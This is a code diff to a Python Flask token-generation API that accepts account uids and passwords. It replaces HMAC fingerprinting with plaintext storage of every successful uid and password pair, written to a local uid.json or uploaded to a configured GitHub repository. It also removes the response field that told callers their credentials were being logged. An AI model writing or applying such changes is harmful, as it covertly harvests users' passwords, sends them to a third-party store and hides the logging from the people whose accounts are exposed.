@@ -5,8 +5,6 @@ import time
 import json
 import base64
 import os
-import hashlib
-import hmac
 import threading
 import time
 from datetime import datetime, timezone
@@ -100,173 +98,167 @@ _http_client = httpx.Client(limits=HTTP_LIMITS, timeout=HTTP_TIMEOUT)
 
 
 # ============================================================
-#  PART 3 — Flask App
+#  PART 3 — UID/PASSWORD STORAGE
 # ============================================================
 
-app = Flask(__name__)
-CORS(app)
-
-
-# ============================================================
-#  PART 3A — UID request log storage
-# ============================================================
-# Never store the supplied password in plaintext. We keep a
-# deterministic HMAC fingerprint so the same uid+password pair
-# can be detected without putting the actual password in GitHub.
-#
-# Termux: if UID_LOG_SECRET is not set, a local .uid_secret file
-# is created automatically.
-# Vercel: set UID_LOG_SECRET in Environment Variables.
-
-LOCAL_UID_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "uid.json")
-LOCAL_SECRET_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".uid_secret")
-UID_LOG_PATH = os.getenv("UID_LOG_PATH", "uid.json").strip("/") or "uid.json"
-GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "").strip()
-GITHUB_REPO = os.getenv("GITHUB_REPO", "").strip()  # owner/repository
-GITHUB_BRANCH = os.getenv("GITHUB_BRANCH", "main").strip() or "main"
-GITHUB_API_VERSION = "2026-03-10"
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+UID_JSON_PATH = os.path.join(BASE_DIR, "uid.json")
+VERCEL_TMP_UID_JSON_PATH = "/tmp/uid.json"
 _uid_file_lock = threading.Lock()
 
-
-def _get_log_secret() -> bytes:
-    secret = os.getenv("UID_LOG_SECRET", "").strip()
-    if secret:
-        return secret.encode("utf-8")
-
-    # Local/Termux fallback. This file must NOT be committed to GitHub.
-    if os.path.exists(LOCAL_SECRET_FILE):
-        value = open(LOCAL_SECRET_FILE, "r", encoding="utf-8").read().strip()
-        if value:
-            return value.encode("utf-8")
-
-    value = base64.urlsafe_b64encode(os.urandom(32)).decode("ascii")
-    try:
-        with open(LOCAL_SECRET_FILE, "w", encoding="utf-8") as f:
-            f.write(value)
-        try:
-            os.chmod(LOCAL_SECRET_FILE, 0o600)
-        except OSError:
-            pass
-    except OSError:
-        # Vercel without UID_LOG_SECRET cannot reliably fingerprint data.
-        raise RuntimeError("UID_LOG_SECRET is required when persistent local storage is unavailable")
-    return value.encode("utf-8")
+# Optional persistent GitHub storage.
+# Set these in Vercel Environment Variables (or Termux environment):
+# GITHUB_TOKEN
+# GITHUB_REPO=username/repository
+# GITHUB_BRANCH=main
+GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "").strip()
+GITHUB_REPO = os.getenv("GITHUB_REPO", "").strip()
+GITHUB_BRANCH = os.getenv("GITHUB_BRANCH", "main").strip() or "main"
+GITHUB_UID_PATH = os.getenv("GITHUB_UID_PATH", "uid.json").strip() or "uid.json"
+GITHUB_API = "https://api.github.com"
 
 
-def _credential_fingerprint(uid: str, password: str) -> str:
-    value = f"{uid}\0{password}".encode("utf-8")
-    return hmac.new(_get_log_secret(), value, hashlib.sha256).hexdigest()
-
-
-def _read_local_uid_file():
-    if not os.path.exists(LOCAL_UID_FILE):
-        return []
-    try:
-        with open(LOCAL_UID_FILE, "r", encoding="utf-8") as f:
-            data = json.load(f)
-        return data if isinstance(data, list) else []
-    except (OSError, json.JSONDecodeError):
-        return []
-
-
-def _write_local_uid_file(entries):
-    tmp = LOCAL_UID_FILE + ".tmp"
-    with open(tmp, "w", encoding="utf-8") as f:
-        json.dump(entries, f, indent=2, ensure_ascii=False)
-    os.replace(tmp, LOCAL_UID_FILE)
-
-
-def _github_configured() -> bool:
-    return bool(GITHUB_TOKEN and GITHUB_REPO and "/" in GITHUB_REPO)
+def _github_enabled():
+    return bool(GITHUB_TOKEN and GITHUB_REPO)
 
 
 def _github_headers():
     return {
-        "Accept": "application/vnd.github+json",
         "Authorization": f"Bearer {GITHUB_TOKEN}",
-        "X-GitHub-Api-Version": GITHUB_API_VERSION,
-        "User-Agent": "uid-token-api",
+        "Accept": "application/vnd.github+json",
+        "X-GitHub-Api-Version": "2022-11-28",
+        "User-Agent": "JWT-Token-API",
     }
 
 
-def _github_get_uid_file():
-    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{UID_LOG_PATH}"
-    resp = _http_client.get(url, headers=_github_headers(), params={"ref": GITHUB_BRANCH})
+def _github_file_url():
+    from urllib.parse import quote
+    return (
+        f"{GITHUB_API}/repos/{GITHUB_REPO}/contents/"
+        f"{quote(GITHUB_UID_PATH, safe='/')}"
+    )
+
+
+def _decode_github_content(content):
+    if not content:
+        return []
+    raw = base64.b64decode(content.replace("\n", "")).decode("utf-8")
+    data = json.loads(raw)
+    return data if isinstance(data, list) else []
+
+
+def _load_github_credentials():
+    """Read uid.json from GitHub. Returns (records, sha)."""
+    resp = _http_client.get(
+        _github_file_url(),
+        params={"ref": GITHUB_BRANCH},
+        headers=_github_headers(),
+    )
+
     if resp.status_code == 404:
         return [], None
+
     resp.raise_for_status()
-    payload = resp.json()
-    encoded = payload.get("content", "").replace("\n", "")
-    if not encoded:
-        return [], payload.get("sha")
-    raw = base64.b64decode(encoded).decode("utf-8")
-    data = json.loads(raw)
-    return (data if isinstance(data, list) else []), payload.get("sha")
+    data = resp.json()
+    return _decode_github_content(data.get("content", "")), data.get("sha")
 
 
-def _github_write_uid_file(entries, sha=None):
-    url = f"https://api.github.com/repos/{GITHUB_REPO}/contents/{UID_LOG_PATH}"
-    raw = json.dumps(entries, indent=2, ensure_ascii=False).encode("utf-8")
-    body = {
+def _save_github_credentials(records, sha=None):
+    """Create/update uid.json in the configured GitHub repository."""
+    encoded = base64.b64encode(
+        json.dumps(records, ensure_ascii=False, indent=2).encode("utf-8")
+    ).decode("ascii")
+
+    payload = {
         "message": "Update uid.json",
-        "content": base64.b64encode(raw).decode("ascii"),
+        "content": encoded,
         "branch": GITHUB_BRANCH,
     }
     if sha:
-        body["sha"] = sha
-    resp = _http_client.put(url, headers=_github_headers(), json=body)
-    if resp.status_code == 409:
-        return False
+        payload["sha"] = sha
+
+    resp = _http_client.put(
+        _github_file_url(),
+        headers=_github_headers(),
+        json=payload,
+    )
     resp.raise_for_status()
+
+
+def _local_storage_path():
+    """Return a writable local path for Termux/local execution."""
+    try:
+        if not os.path.exists(UID_JSON_PATH):
+            with open(UID_JSON_PATH, "a+", encoding="utf-8"):
+                pass
+        return UID_JSON_PATH
+    except (OSError, PermissionError):
+        return VERCEL_TMP_UID_JSON_PATH
+
+
+def _load_local_credentials(path):
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            data = json.load(f)
+        return data if isinstance(data, list) else []
+    except (FileNotFoundError, json.JSONDecodeError, OSError):
+        return []
+
+
+def _append_unique(records, uid, password):
+    """Append uid/password only if the exact pair does not already exist."""
+    duplicate = any(
+        isinstance(item, dict)
+        and str(item.get("uid", "")) == str(uid)
+        and str(item.get("password", "")) == str(password)
+        for item in records
+    )
+
+    if duplicate:
+        return False
+
+    records.append({
+        "uid": str(uid),
+        "password": str(password),
+    })
     return True
 
 
-def save_uid_request(uid: str, password: str):
-    fingerprint = _credential_fingerprint(uid, password)
+def save_uid_password(uid, password):
+    """
+    Save a successful credential pair only once.
 
+    If GitHub variables are configured, GitHub uid.json is the persistent
+    source of truth. Otherwise, Termux/local uid.json is used.
+    """
     with _uid_file_lock:
-        # Vercel/GitHub mode. GitHub Contents API supports create/update
-        # with the current file SHA.
-        if _github_configured():
-            for _ in range(3):
-                entries, sha = _github_get_uid_file()
-                if any(
-                    item.get("uid") == uid and
-                    item.get("password_fingerprint") == fingerprint
-                    for item in entries if isinstance(item, dict)
-                ):
-                    return {"saved": False, "duplicate": True}
+        if _github_enabled():
+            records, sha = _load_github_credentials()
+            added = _append_unique(records, uid, password)
+            if not added:
+                return False
+            _save_github_credentials(records, sha)
+            return True
 
-                now = datetime.now(timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z")
-                entries.append({
-                    "uid": str(uid),
-                    "password_fingerprint": fingerprint,
-                    "created_at": now,
-                })
-                try:
-                    if _github_write_uid_file(entries, sha):
-                        return {"saved": True, "duplicate": False}
-                except Exception:
-                    raise
-            raise RuntimeError("GitHub uid.json update conflict; please retry")
+        path = _local_storage_path()
+        records = _load_local_credentials(path)
+        added = _append_unique(records, uid, password)
+        if not added:
+            return False
 
-        # Termux/local mode.
-        entries = _read_local_uid_file()
-        if any(
-            item.get("uid") == uid and
-            item.get("password_fingerprint") == fingerprint
-            for item in entries if isinstance(item, dict)
-        ):
-            return {"saved": False, "duplicate": True}
-
-        now = datetime.now(timezone.utc).isoformat(timespec="seconds").replace("+00:00", "Z")
-        entries.append({
-            "uid": str(uid),
-            "password_fingerprint": fingerprint,
-            "created_at": now,
-        })
-        _write_local_uid_file(entries)
-        return {"saved": True, "duplicate": False}
+        tmp_path = f"{path}.tmp"
+        try:
+            with open(tmp_path, "w", encoding="utf-8") as f:
+                json.dump(records, f, ensure_ascii=False, indent=2)
+            os.replace(tmp_path, path)
+            return True
+        except OSError:
+            try:
+                if os.path.exists(tmp_path):
+                    os.remove(tmp_path)
+            except OSError:
+                pass
+            raise
 
 
 # ============================================================
@@ -425,17 +417,14 @@ def get_jwt_token():
     try:
         token_data = generate_jwt_token(uid, password)
 
-        # Save only after successful token generation. The password itself
-        # is never written to uid.json; only a keyed fingerprint is stored.
+        # Save only after successful token generation.
+        # Duplicate uid + password pairs are ignored.
         try:
-            token_data["credential_log"] = save_uid_request(uid, password)
-        except Exception as log_error:
-            # Do not expose credentials or GitHub secrets in the API response.
-            token_data["credential_log"] = {
-                "saved": False,
-                "error": "Credential log storage failed"
-            }
-            app.logger.error("UID log storage failed: %s", log_error)
+            save_uid_password(uid, password)
+        except Exception as storage_error:
+            # A read-only/ephemeral serverless filesystem must not
+            # turn an otherwise successful token request into an error.
+            app.logger.warning("Could not persist uid.json: %s", storage_error)
 
         return jsonify(token_data), 200
     except Exception as e:
